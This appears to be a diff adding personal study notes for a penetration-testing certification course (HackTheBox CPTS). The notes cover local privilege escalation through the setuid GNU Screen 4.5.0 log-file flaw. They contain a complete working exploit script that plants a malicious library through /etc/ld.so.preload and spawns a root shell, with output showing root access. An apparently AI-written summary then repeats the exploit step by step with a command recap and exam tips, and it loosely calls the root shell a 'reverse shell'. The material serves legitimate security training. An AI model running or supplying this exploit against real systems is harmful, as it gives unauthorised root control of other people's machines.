@@ -1,0 +1,275 @@
+Many services may be found, which have flaws that can be leveraged to escalate privileges. An example is the popular terminal multiplexer Screen. Version 4.5.0 suffers from a privilege escalation vulnerability due to a lack of a permissions check when opening a log file.
+
+Screen Version Identification
+  Vulnerable Services
+MJBUCKNER@htb[/htb]$ screen -v
+
+Screen version 4.05.00 (GNU) 10-Dec-16
+This allows an attacker to truncate any file or create a file owned by root in any directory and ultimately gain full root access.
+
+Privilege Escalation - Screen_Exploit.sh
+  Vulnerable Services
+MJBUCKNER@htb[/htb]$ ./screen_exploit.sh 
+
+~ gnu/screenroot ~
+[+] First, we create our shell and library...
+[+] Now we create our /etc/ld.so.preload file...
+[+] Triggering...
+' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
+[+] done!
+No Sockets found in /run/screen/S-mrb3n.
+
+# id
+uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare),1000(mrb3n)
+The below script can be used to perform this privilege escalation attack:
+
+Screen_Exploit_POC.sh
+Code: bash
+#!/bin/bash
+# screenroot.sh
+# setuid screen v4.5.0 local root exploit
+# abuses ld.so.preload overwriting to get root.
+# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
+# HACK THE PLANET
+# ~ infodox (25/1/2017)
+echo "~ gnu/screenroot ~"
+echo "[+] First, we create our shell and library..."
+cat << EOF > /tmp/libhax.c
+#include <stdio.h>
+#include <sys/types.h>
+#include <unistd.h>
+#include <sys/stat.h>
+__attribute__ ((__constructor__))
+void dropshell(void){
+    chown("/tmp/rootshell", 0, 0);
+    chmod("/tmp/rootshell", 04755);
+    unlink("/etc/ld.so.preload");
+    printf("[+] done!\n");
+}
+EOF
+gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
+rm -f /tmp/libhax.c
+cat << EOF > /tmp/rootshell.c
+#include <stdio.h>
+int main(void){
+    setuid(0);
+    setgid(0);
+    seteuid(0);
+    setegid(0);
+    execvp("/bin/sh", NULL, NULL);
+}
+EOF
+gcc -o /tmp/rootshell /tmp/rootshell.c -Wno-implicit-function-declaration
+rm -f /tmp/rootshell.c
+echo "[+] Now we create our /etc/ld.so.preload file..."
+cd /etc
+umask 000 # because
+screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
+echo "[+] Triggering..."
+screen -ls # screen itself is setuid, so...
+/tmp/rootshell
+
+GPT Summary 
+🧨 Vulnerable Services - screen Privilege Escalation (CVE-2017-5618)
+🎯 Goal
+Exploit a setuid root binary (screen v4.5.0) to write to /etc/ld.so.preload and gain a root shell.
+
+🔍 Why This Works
+screen is a terminal multiplexer.
+
+Versions 4.5.0 and below have a flaw where, when logging is enabled with -L, it can create a log file anywhere, and doesn’t check permissions properly.
+
+Since it's setuid root, and you can control where it writes, you can make it:
+
+Overwrite /etc/ld.so.preload
+
+Load a malicious shared object when any root binary is executed
+
+🧪 Step-by-Step Exploitation
+🔹 Step 1: Identify the vulnerable version
+bash
+Copy
+Edit
+screen -v
+If you see:
+
+bash
+Copy
+Edit
+Screen version 4.05.00 (GNU) 10-Dec-16
+✅ You’re working with a vulnerable binary.
+
+🔹 Step 2: Craft the Exploit Payload
+You’ll need two things:
+
+A malicious shared object that escalates privileges
+
+A fake root shell binary placed somewhere writable (like /tmp)
+
+You can use the pre-made exploit script:
+
+bash
+Copy
+Edit
+./screen_exploit.sh
+Or manually:
+
+bash
+Copy
+Edit
+# Create the malicious shared object
+cat << EOF > /tmp/libhax.c
+#include <stdio.h>
+#include <unistd.h>
+#include <sys/stat.h>
+__attribute__ ((__constructor__))
+void dropshell(void){
+    chown("/tmp/rootshell", 0, 0);
+    chmod("/tmp/rootshell", 04755);
+    unlink("/etc/ld.so.preload");
+}
+EOF
+gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
+Then create the setuid root binary:
+
+bash
+Copy
+Edit
+cat << EOF > /tmp/rootshell.c
+#include <unistd.h>
+int main() {
+    setuid(0); setgid(0);
+    execl("/bin/sh", "sh", NULL);
+}
+EOF
+gcc -o /tmp/rootshell /tmp/rootshell.c
+🔹 Step 3: Abuse screen to overwrite /etc/ld.so.preload
+bash
+Copy
+Edit
+cd /etc
+umask 000
+screen -D -m -L ld.so.preload echo -ne "\n/tmp/libhax.so"
+This forces screen to create or overwrite /etc/ld.so.preload with the malicious .so file.
+
+The newline (\n) is critical — without it, the path won’t load properly.
+
+🔹 Step 4: Trigger and Escalate
+Any time a root binary is executed, your malicious .so gets loaded.
+
+You can trigger it by running:
+
+bash
+Copy
+Edit
+screen -ls
+Then:
+
+bash
+Copy
+Edit
+/tmp/rootshell
+# id
+uid=0(root) gid=0(root)
+You’re root.
+
+🛠️ Quick Command Flow Recap
+bash
+Copy
+Edit
+screen -v                                 # Check vulnerable version
+gcc -fPIC -shared -ldl -o /tmp/libhax.so libhax.c
+gcc -o /tmp/rootshell rootshell.c
+cd /etc
+umask 000
+screen -D -m -L ld.so.preload echo -ne "\n/tmp/libhax.so"
+screen -ls                                # Trigger preload
+/tmp/rootshell                            # Spawn root shell
+🧠 CPTS/Exam Tips:
+You won’t always have internet, so you may need to write the .so and shell manually.
+
+Know how to:
+
+Compile C with gcc
+
+Abuse ld.so.preload
+
+Spot screen version flaws
+
+Always check:
+
+bash
+Copy
+Edit
+screen -v
+ls -la /usr/bin/screen
+If screen is setuid root:
+
+bash
+Copy
+Edit
+-rwsr-xr-x 1 root root ... /usr/bin/screen
+...you’ve got something juicy.
+
+You're absolutely right, Buck — this screen 4.5.0 exploit is 100% exam bait. It's:
+
+Easy to fingerprint ✅
+
+Easy to automate ✅
+
+SetUID-root based ✅
+
+Fully offline exploit (no internet required) ✅
+
+Classic, well-known, and often used in CTFs and real-world misconfigs ✅
+
+🔥 Why it's definitely on the CPTS radar:
+They already taught you how to compile C → This aligns perfectly.
+
+It touches /etc/ld.so.preload abuse, which is a repeat topic across other privesc paths.
+
+SetUID binary enumeration is drilled in earlier sections.
+
+It's root shell with minimal steps, making it a clean end to a Linux escalation chain.
+
+It's a perfect "spot it and pop it" kind of vuln for a 24-hour exam—recognition is the whole test.
+
+✅ What you need burned into your memory for exam readiness:
+1. Version Check
+bash
+Copy
+Edit
+screen -v
+# Must be v4.5.0 or earlier
+2. SetUID Check
+bash
+Copy
+Edit
+ls -la /usr/bin/screen
+# Look for 's' in place of the owner execute bit (-rwsr-xr-x)
+3. Payload Behavior
+Abuses screen’s logging mechanism (-L)
+
+Writes arbitrary content to arbitrary file as root
+
+Drops .so into /etc/ld.so.preload
+
+Triggers it via another screen run
+
+Loads your .so and sets permissions on your reverse shell binary
+
+4. Offline-ready Payload
+.c files for libhax.so and rootshell are needed
+
+Requires gcc
+
+No internet, just local file system and screen
+
+📌 Memory Hook:
+If screen is SUID root and v4.5.0 or earlier — it's free root. Period.
+Just remember:
+
+"Use screen to write preload, trigger screen again, /tmp/rootshell gives you God mode."
+
+
+
